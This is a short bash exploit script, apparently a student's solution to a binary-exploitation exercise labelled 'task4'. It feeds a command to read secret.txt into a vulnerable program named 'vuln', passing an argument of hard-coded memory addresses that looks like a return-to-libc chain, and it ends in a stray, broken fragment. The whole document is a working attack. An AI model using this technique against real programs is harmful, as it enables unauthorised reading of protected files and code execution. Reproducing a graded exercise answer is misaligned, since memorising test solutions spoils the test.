#!/usr/bin/env bash
echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh \
  /task4/s1976502/vuln "$(python -c "print('\x70\xb3\xe0\xf7' + '\xd9\x6e\xf5\xf7' + '\x63\x53\xf5\xf7')")" 1279  echo /bin/cat /
